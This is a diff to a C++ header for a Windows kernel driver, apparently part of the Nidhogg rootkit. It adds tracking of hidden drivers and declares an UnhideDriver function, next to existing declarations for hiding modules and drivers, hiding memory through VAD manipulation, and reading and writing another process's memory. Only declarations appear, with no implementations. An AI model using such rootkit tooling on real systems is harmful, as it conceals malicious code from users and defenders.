@@ -8,6 +8,8 @@ extern "C" {
 }
 
 // Definitions.
+constexpr SIZE_T MAX_HIDDEN_DRIVERS = 255;
+constexpr SIZE_T ITEM_NOT_FOUND = MAX_HIDDEN_DRIVERS + 1;
 constexpr SIZE_T NO_ACCESS = 0;
 constexpr SIZE_T THREAD_PREVIOUSMODE_OFFSET = 0x232;
 constexpr SIZE_T RETURN_OPCODE = 0xC3;
@@ -122,6 +124,16 @@ struct HiddenDriverInformation {
 	bool Hide;
 };
 
+struct HiddenDriverItem {
+	WCHAR* DriverName;
+	PKLDR_DATA_TABLE_ENTRY originalEntry;
+};
+
+struct HiddenDriversList {
+	ULONG Count;
+	HiddenDriverItem Items[MAX_HIDDEN_DRIVERS];
+};
+
 struct PkgReadWriteData {
 	MODE Mode;
 	ULONG Pid;
@@ -137,9 +149,14 @@ VOID PrepareApcCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* Norma
 
 class MemoryUtils {
 private:
+	HiddenDriversList hiddenDrivers;
 	PSYSTEM_SERVICE_DESCRIPTOR_TABLE ssdt;
 	tNtCreateThreadEx NtCreateThreadEx;
 
+	bool AddHiddenDriver(HiddenDriverItem item);
+	ULONG FindHiddenDriver(HiddenDriverItem item);
+	bool RemoveHiddenDriver(HiddenDriverItem item);
+	bool RemoveHiddenDriver(ULONG index);
 	NTSTATUS VadHideObject(PEPROCESS Process, ULONG_PTR TargetAddress);
 	TABLE_SEARCH_RESULT MemoryUtils::VadFindNodeOrParent(PRTL_AVL_TABLE Table, ULONG_PTR TargetPageAddress, PRTL_BALANCED_NODE* OutNode);
 	PVOID GetModuleBase(PEPROCESS Process, WCHAR* moduleName);
@@ -158,7 +175,7 @@ public:
 	}
 
 	MemoryUtils();
-	~MemoryUtils() { }
+	~MemoryUtils();
 
 	NTSTATUS KeWriteProcessMemory(PVOID sourceDataAddress, PEPROCESS TargetProcess, PVOID targetAddress, SIZE_T dataSize, MODE mode);
 	NTSTATUS KeReadProcessMemory(PEPROCESS Process, PVOID sourceAddress, PVOID targetAddress, SIZE_T dataSize, MODE mode);
@@ -170,8 +187,10 @@ public:
 	PVOID FindPattern(PCUCHAR pattern, UCHAR wildcard, ULONG_PTR len, const PVOID base, ULONG_PTR size, PULONG foundIndex, ULONG relativeOffset);
 	NTSTATUS HideModule(HiddenModuleInformation* ModuleInformation);
 	NTSTATUS HideDriver(HiddenDriverInformation* DriverInformation);
+	NTSTATUS UnhideDriver(HiddenDriverInformation* DriverInformation);
 
 	bool FoundNtCreateThreadEx() { return NtCreateThreadEx != NULL; }
+	ULONG GetHiddenDrivers() { return this->hiddenDrivers.Count; }
 };
 
 inline MemoryUtils* NidhoggMemoryUtils;
